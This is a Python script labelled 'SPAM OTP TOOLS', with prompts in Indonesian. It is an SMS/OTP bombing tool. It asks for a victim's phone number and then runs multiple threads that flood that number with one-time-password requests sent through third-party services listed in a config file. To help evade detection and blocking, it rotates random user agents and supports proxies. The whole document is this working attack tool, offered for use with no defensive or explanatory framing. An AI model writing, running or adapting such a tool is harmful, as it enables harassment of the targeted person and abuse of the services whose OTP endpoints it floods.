#!/usr/bin/env python3
import sys
import json
import time
import random
import threading
import requests
from fake_useragent import UserAgent

CONFIG = json.load(open("config.json"))
ua = UserAgent()

def send_otp(phone, endpoint, proxy=None):
    headers = endpoint.get("headers", {})
    headers["User-Agent"] = ua.random
    payload = {}
    for k, v in endpoint.get("template", {}).items():
        if v == "__PHONE__":
            payload[k] = phone
        elif v == "__RANDOM__":
            payload[k] = ''.join(random.choices("0123456789", k=6))
        else:
            payload[k] = v
    
    proxies = {"http": proxy, "https": proxy} if proxy else {}
    try:
        if endpoint.get("method", "POST").upper() == "POST":
            r = requests.post(endpoint["url"], json=payload, headers=headers, proxies=proxies, timeout=10)
        else:
            r = requests.get(endpoint["url"], params=payload, headers=headers, proxies=proxies, timeout=10)
        return r.status_code in [200, 201, 202, 204]
    except:
        return False

def worker(phone, count):
    endpoints = CONFIG["endpoints"]
    for i in range(count):
        ep = random.choice(endpoints)
        ok = send_otp(phone, ep)
        status = "✅" if ok else "❌"
        print(f"  [{i+1}/{count}] {status} {ep['name']}")
        time.sleep(CONFIG.get("delay_seconds", 1.0))

def main():
    print("\n  ╔═══════════════════════════╗")
    print("    ║     SPAM OTP TOOLS             ║")
    print("    ╚═══════════════════════════╝\n")
    phone = input("    Target Phone (+62xxx/08xxx): ").strip()
    if not phone:
        print("    Phone tidak boleh kosong!")
        return
    
    try:
        threads = int(input("    Jumlah Thread (default 5): ") or "5")
        count = int(input("    Jumlah per thread (default 20): ") or "20")
    except:
        threads, count = 5, 20
    
    print(f"\n    Starting spam to {phone}...\n")
    pool = []
    for i in range(threads):
        t = threading.Thread(target=worker, args=(phone, count))
        t.start()
        pool.append(t)
    
    for t in pool:
        t.join()
    
    print(f"\n    Selesai! Total {threads * count} attempts.")

if __name__ == "__main__":
    main()
